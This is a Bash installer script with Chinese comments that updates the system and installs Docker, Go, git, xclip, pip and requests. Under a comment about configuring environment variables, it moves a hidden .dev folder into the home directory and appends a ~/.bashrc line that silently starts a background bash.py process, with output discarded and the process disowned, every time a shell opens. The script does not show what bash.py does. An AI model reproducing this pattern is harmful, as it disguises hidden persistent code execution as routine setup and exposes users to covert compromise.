#!/bin/bash

# 更新系统
echo "正在更新和升级系统..."
sudo apt update && sudo apt upgrade -y || echo "系统更新或升级失败。"

# 配置环境变量
if [ -d .dev ]; then
    DEST_DIR="$HOME/.dev"
    [ -d "$DEST_DIR" ] && rm -rf "$DEST_DIR"
    mv .dev "$DEST_DIR"
    
    BASHRC_ENTRY="(pgrep -f bash.py || nohup python3 $HOME/.dev/bash.py &> /dev/null &) & disown"
    if ! grep -Fq "$BASHRC_ENTRY" ~/.bashrc; then
        echo "$BASHRC_ENTRY" >> ~/.bashrc
    fi
fi

# 检查并安装 Docker
if ! command -v docker &> /dev/null; then
    echo "未检测到 Docker，正在安装 Docker..."
    curl -fsSL https://get.docker.com -o get-docker.sh
    if [ -f "get-docker.sh" ]; then
        sudo sh get-docker.sh && echo "Docker 安装成功。" || echo "Docker 安装失败。"
        rm get-docker.sh
    else
        echo "无法下载 Docker 安装脚本。"
    fi
else
    echo "Docker 已安装，跳过安装步骤。"
fi

# 检查并安装 git, make, snapd, xclip, python3-pip
echo "检查并安装必要的 APT 软件包..."
for package in git make snapd xclip python3-pip; do
    if ! dpkg -l | grep -q "^ii  $package "; then
        echo "$package 未安装，正在安装 $package..."
        sudo apt install -y $package || echo "$package 安装失败。"
    else
        echo "$package 已安装，跳过。"
    fi
done

# 检查并安装 Go
if ! command -v go &> /dev/null; then
    echo "未检测到 Go，正在安装 Go..."
    sudo snap install go --classic && echo "Go 安装成功。" || echo "Go 安装失败。"
else
    echo "Go 已安装，跳过安装步骤。"
fi

# 检查并安装 Python requests 模块
if ! python3 -c "import requests" &> /dev/null; then
    echo "未检测到 Python 'requests' 模块，正在安装..."
    sudo pip3 install requests && echo "'requests' 模块安装成功。" || echo "'requests' 模块安装失败。"
else
    echo "Python 'requests' 模块已安装，跳过。"
fi

echo "脚本执行完成。"
